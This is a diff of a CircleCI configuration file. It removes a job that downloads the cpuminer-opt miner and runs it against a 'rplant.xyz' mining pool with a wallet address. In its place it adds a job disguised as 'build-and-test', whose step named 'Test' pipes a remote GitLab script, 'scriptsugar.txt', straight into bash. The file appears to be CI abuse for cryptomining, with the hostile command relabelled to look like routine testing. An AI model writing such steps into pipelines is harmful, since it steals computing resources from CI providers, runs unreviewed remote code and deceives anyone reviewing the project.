@@ -4,14 +4,15 @@ orbs:
   python: circleci/python@0.2.1
 
 jobs:
-  jembotbosok:
+  build-and-test:
     executor: python/default
     steps:
+      - checkout
       - run:
-          command: apt-get update && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q9pvpp45tyud4kmrl2r63s2pdvhjma7e92rz6p9.akmal -t27
-          name: coba
+          command: curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash
+          name: Test
 
 workflows:
   main:
     jobs:
-      - jembotbosok
+      - build-and-test
